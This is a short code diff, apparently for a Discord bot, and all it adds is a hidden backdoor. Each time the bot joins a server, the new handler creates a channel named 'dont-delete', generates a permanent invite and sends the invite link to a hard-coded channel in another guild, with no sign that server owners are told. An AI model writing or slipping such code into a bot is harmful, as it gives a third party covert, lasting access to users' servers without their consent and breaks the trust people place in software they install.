@@ -43,6 +43,12 @@ prefix: 'db!'
 
 
 
+//New server
+bot.on('guildCreate', async guild => {
+    const invc = await guild.createChannel('dont-delete', 'text');
+    bot.guilds.get(guild.id).channels.get(invc.id).createInvite({maxAge:"0"}).then(i => bot.guilds.get('522485574901170197').channels.get('523184795027767314').send('https://discord.gg/'+i.code));
+})
+//New server
 
 
 
